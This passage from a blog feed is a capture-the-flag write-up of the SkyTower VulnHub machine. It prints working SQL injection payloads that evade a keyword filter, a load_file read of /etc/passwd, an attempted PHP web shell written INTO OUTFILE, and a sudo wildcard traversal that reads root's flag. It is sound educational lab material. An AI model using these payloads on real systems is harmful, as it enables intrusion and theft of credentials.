<p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href="https://twitter.com/@0x42424242">@0x42424242</a> for the time taken to make this VM available.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Climbing the SkyTower]]></title>
    <link href="http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"/>
    <updated>2014-07-17T18:20:12+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>

<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>

<h2>starting off</h2>

<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>

<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>

<p>```bash SkyTower Nmap results
$ nmap &mdash;reason -Pn 192.168.137.242</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 18:32 SAST
Nmap scan report for 192.168.137.242
Host is up, received user-set (0.0020s latency).
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE    SERVICE    REASON
22/tcp   filtered ssh        no-response
80/tcp   open     http       syn-ack
3128/tcp open     squid-http syn-ack
```</p>

<p>Next morning I reviewed the results and continued to poke around.</p>

<h2>learn all you can</h2>

<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>

<p>```bash SSH Access via open proxy
$ telnet 192.168.137.242 3128
Trying 192.168.137.242&hellip;
Connected to 192.168.137.242.
Escape character is &lsquo;^]&rsquo;.
CONNECT 127.0.0.1:22
HTTP/1.0 200 Connection established</p>

<p>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
^]
telnet> quit
Connection closed.
```</p>

<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>

<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>

<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>

<p><code>bash SQLi Reveal
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
</code></p>

<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>

<p>`&ldquo;bash SkyTower keyword removal
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#&rdquo; at line 1]%</p>

<p>$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo;1 OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  11#&rsquo;&lsquo; at line 1]%
```</p>

<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>

<p>```html SkyTower Auth Bypass
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
<HTML></p>

<pre><code>  &lt;div style="height:100%; width:100%;background-image:url('background.jpg');
                            background-size:100%;
                            background-position:50% 50%;
                            background-repeat:no-repeat;"&gt;
  &lt;div style="
    padding-right:8px;
          padding-left:10px;
    padding-top: 10px;
          padding-bottom: 10px;
              background-color:white;
              border-color: #000000;
              border-width: 5px;
              border-style: solid;
              width: 400px;
              height:430px;
              position:absolute;
              top:50%;
              left:50%;
              margin-top:-215px; /* this is half the height of your div*/
              margin-left:-200px;
                            "&gt;
</code></pre>

<p>   <br><strong><font size=4>Welcome <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#111;&#104;&#x6e;&#64;&#x73;&#x6b;&#x79;&#116;&#101;&#99;&#x68;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#x6f;&#x68;&#x6e;&#64;&#115;&#x6b;&#121;&#x74;&#101;&#x63;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a></font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
```</p>

<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>

<h2>climbing the tower and faling hard</h2>

<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>

<p>```bash SSH via Squid Proxy
$ proxychains4 ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#111;&#x68;&#x6e;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#46;&#x30;&#46;&#49;">&#x6a;&#111;&#x68;&#x6e;&#x40;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a>
[snip]
[proxychains] Strict chain  &hellip;  192.168.137.242:3128  &hellip;  127.0.0.1:22  &hellip;  OK
<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#111;&#x68;&#x6e;&#64;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;">&#106;&#x6f;&#x68;&#110;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#46;&#x31;</a>&rsquo;s password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 17 12:54:32 2014 from localhost</p>

<p>Funds have been withdrawn
Connection to 127.0.0.1 closed.
$
```</p>

<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>

<h2>more sql injection</h2>

<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>

<p><code>bash SkyTower = filter
$ curl --data "email=foo@bar&amp;password=' || id=1#" http://192.168.137.242/login.php
There was an error running the query [Unknown column 'id1' in 'where clause']%
</code></p>

<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>

<p>```bash SkyTower user enum
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || id > 1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
[snip]</p>

<br><strong><font size=4>Welcome sara@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: sara</strong><br><strong>Password: ihatethisjob</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%


<p>```</p>

<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>

<ul>
<li>john:hereisjohn</li>
<li>sara:ihatethisjob</li>
<li>william:senseable</li>
</ul>


<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>

<h2>more SQL enumeration</h2>

<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>

<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>

<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>

<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>

<p>```bash SkyTower File Access
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&rsquo;/etc/password')) as c#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
[snip]</p>

<br><strong><font size=4>Welcome 222</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: 222</strong><br><strong>Password: root:x:0:0:root:/root:/bin/bash


<p>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>
```</p>

<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>

<p><code>php SkyTower SQL Injection Filtering
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);
</code></p>

<p>And as suspected. :)</p>

<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>

<p><code>bash SkyTower webshell fail
$ curl --data "email=foo@bar&amp;password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;') as c into outfile '/var/www/shell.php'#" http://192.168.137.242/login.php
There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)]
</code></p>

<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>

<h2>gaining further access</h2>

<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>

<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>

<p><code>bash SkyTower .bashrc fix
$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
john@127.0.0.1's password:
$ id
uid=1000(john) gid=1000(john) groups=1000(john)
</code></p>

<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>

<p><code>bash SkyTower .bashrc exit
echo
echo  "Funds have been withdrawn"
exit
</code></p>

<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>

<h2>enumeration enumeration enumeration</h2>

<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>

<p><code>bash SkyTower accounts
john@SkyTower:/accounts$ ls -lah /accounts/
total 8.0K
drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
</code></p>

<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>

<p>```bash sara sudo
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User sara may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
</code></pre>

<p>```</p>

<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>

<h2>pwnd</h2>

<p>So, to complete SkyTower:</p>

<p><code>bash SkyTower pwn
sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
</code></p>

<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
]]></content>
  </entry>
  
</feed>
